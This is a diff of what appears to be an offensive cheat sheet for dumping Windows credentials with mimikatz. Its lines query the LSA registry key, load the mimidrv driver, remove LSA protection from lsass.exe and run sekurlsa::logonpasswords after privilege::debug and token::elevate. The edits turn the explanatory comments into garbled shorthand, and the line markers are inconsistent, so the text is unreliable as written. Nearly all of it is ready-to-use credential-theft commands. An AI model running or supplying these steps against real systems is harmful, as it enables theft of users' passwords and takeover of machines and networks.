@@ -62,13 +62,13 @@ $ -reg [+] HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v Us
 >  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 ~
   # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
-  # Now lets import the mimidriver.sys to the system
+>>>import mimidriver.sys
 $  mimikatz # !+
 ~
-  # Now lets remove the protection flags from lsass.exe process
+  # -rm protection flag from lsass.exe process
 >  mimikatz # !processprotect /process:lsass.exe /remove
 ~
-  # Finally run the logonpasswords function to dump lsass
+  # run log-on_pswd function -dump -lsass
 $  mimikatz # privilege::debug    
 $  mimikatz # token::elevate
 $  mimikatz # sekurlsa::logonpasswords
